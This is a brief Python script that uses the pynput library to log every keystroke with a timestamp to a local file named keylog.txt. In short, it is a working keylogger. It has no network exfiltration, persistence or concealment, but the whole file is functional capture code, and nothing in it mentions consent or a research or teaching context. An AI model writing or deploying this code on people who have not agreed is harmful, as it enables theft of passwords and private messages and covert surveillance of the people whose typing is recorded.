from pynput import keyboard
import datetime
import json

log_file="keylog.txt"

def log_key(key):
    try:
        key_data = {
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "key": str(key).replace("'", "")
        }
        
        # Append to JSON log file
        with open(log_file, "a") as log:
            log.write(json.dumps(key_data) + "\n")
    except Exception as e:
        print(f"Error logging key: {e}")

def on_press(key):
    log_key(key)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

